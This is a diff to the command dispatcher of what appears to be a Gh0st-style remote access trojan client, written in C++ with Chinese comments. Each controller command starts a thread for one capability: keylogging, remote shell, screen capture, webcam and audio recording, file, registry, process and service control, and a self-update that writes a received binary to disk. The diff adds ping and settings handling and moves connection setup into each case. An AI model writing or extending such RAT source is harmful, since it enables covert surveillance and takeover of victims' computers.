@@ -17,6 +17,12 @@ CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, 
 	: m_conn(conn), m_hInstance(hInstance), CManager(ClientObject)
 {
 	m_ulThreadCount = 0;
+#ifdef _DEBUG
+	m_settings = { 5 };
+#else
+	m_settings = { 30 };
+#endif
+	m_nNetPing = -1;
 }
 
 CKernelManager::~CKernelManager()
@@ -113,50 +119,60 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		}
 	}
 	else if (!isExit){
-		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+		m_hThread[m_ulThreadCount].p = nullptr;
 		m_hThread[m_ulThreadCount].conn = m_conn;
 	}
 
 	switch(szBuffer[0])
 	{
+	case CMD_HEARTBEAT_ACK:
+		if (ulLength > 8) {
+			uint64_t n = 0;
+			memcpy(&n, szBuffer + 1, sizeof(uint64_t));
+			auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
+				std::chrono::system_clock::now()
+				);
+			m_nNetPing = int((system_ms.time_since_epoch().count() - n) / 2);
+		}
+		break;
+	case CMD_MASTERSETTING:
+		if (ulLength > sizeof(MasterSettings)) {
+			memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
+		}
+		break;
 	case COMMAND_KEYBOARD: //键盘记录
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0,
-				LoopKeyboardManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_TALK:
 		{
-			m_hThread[m_ulThreadCount].user = m_hInstance;
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopTalkManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount].user = m_hInstance; 
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SHELL:
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopShellManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SYSTEM:       //远程进程管理
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
-				LoopProcessManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_WSLIST:       //远程窗口管理
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopWindowManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -184,59 +200,49 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			if (ulLength > 1) {
 				memcpy(user->buffer, szBuffer + 1, ulLength - 1);
 			}
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
 		    m_hThread[m_ulThreadCount].user = user;
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopScreenManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_LIST_DRIVE :
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopFileManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_WEBCAM:
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopVideoManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_AUDIO:
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopAudioManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_REGEDIT:
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopRegisterManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SERVICES:
 		{
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				LoopServicesManager,
-				&m_hThread[m_ulThreadCount], 0, NULL);
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
 			break;
 		}
 
 	case COMMAND_UPDATE:
 		{
-			if (m_ulThreadCount != -1) {
-				delete m_hThread[m_ulThreadCount].p;
-				m_hThread[m_ulThreadCount].p = NULL;
-			}
 			ULONGLONG size=0;
 			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
 			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
@@ -247,14 +253,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	default:
 		{
-			OutputDebugStringA("======> Error operator\n");
-			char buffer[256] = {};
-			strncpy(buffer, (const char*)(szBuffer+1), sizeof(buffer));
-			Mprintf("!!! Unknown command: %s\n", buffer);
-			if (m_ulThreadCount != -1) {
-				delete m_hThread[m_ulThreadCount].p;
-				m_hThread[m_ulThreadCount].p = NULL;
-			}
+			Mprintf("!!! Unknown command: %d\n", unsigned(szBuffer[0]));
 			break;
 		}
 	}
